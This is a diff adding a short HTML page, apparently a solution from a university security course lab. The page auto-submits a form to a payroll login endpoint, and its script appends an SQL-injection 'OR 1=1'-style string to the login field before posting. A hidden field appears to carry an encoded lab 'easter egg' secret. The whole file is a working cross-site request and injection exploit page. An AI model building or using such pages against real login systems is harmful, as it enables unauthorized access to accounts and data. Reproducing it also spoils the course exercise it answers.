@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>SQL Injection</title>
+    <script>
+	function createString(){
+        	var userName = document.getElementById("targetlogin").value
+		var maliciousInput = userName + "' O;R 1 = '1 ";
+		console.log('m =' + maliciousInput);
+		document.getElementById('targetlogin').value = maliciousInput;
+		console.log('doc = ' + document.getElementById('targetlogin').value);
+	}
+	
+    </script>
+  </head>
+  <body>
+    <form action="http://payroll.gatech.edu/index.php" onsubmit="createString()" method="POST">
+      <input name="login" id="targetlogin"  value = "">	
+      <input name="pw" type = "hidden" value = "">
+      <input name="action" type = "hidden" value = "login">	
+      <input name="U3ByaW5nbDIwMjAtRWFzdGVyRWdnLVRhcmdldDMtSXQnc0FTZWNyZXQ" type = "hidden" value = "U3ByaW5nbDIwMjAtRWFzdGVyRWdnLVRhcmdldDMtSXQnc0FTZWNyZXQ">		
+      <button id="exploit" onclick = "document.forms[0].submit()">Hold onto your butts!</button>
+    </form>
+  </body>
+</html>
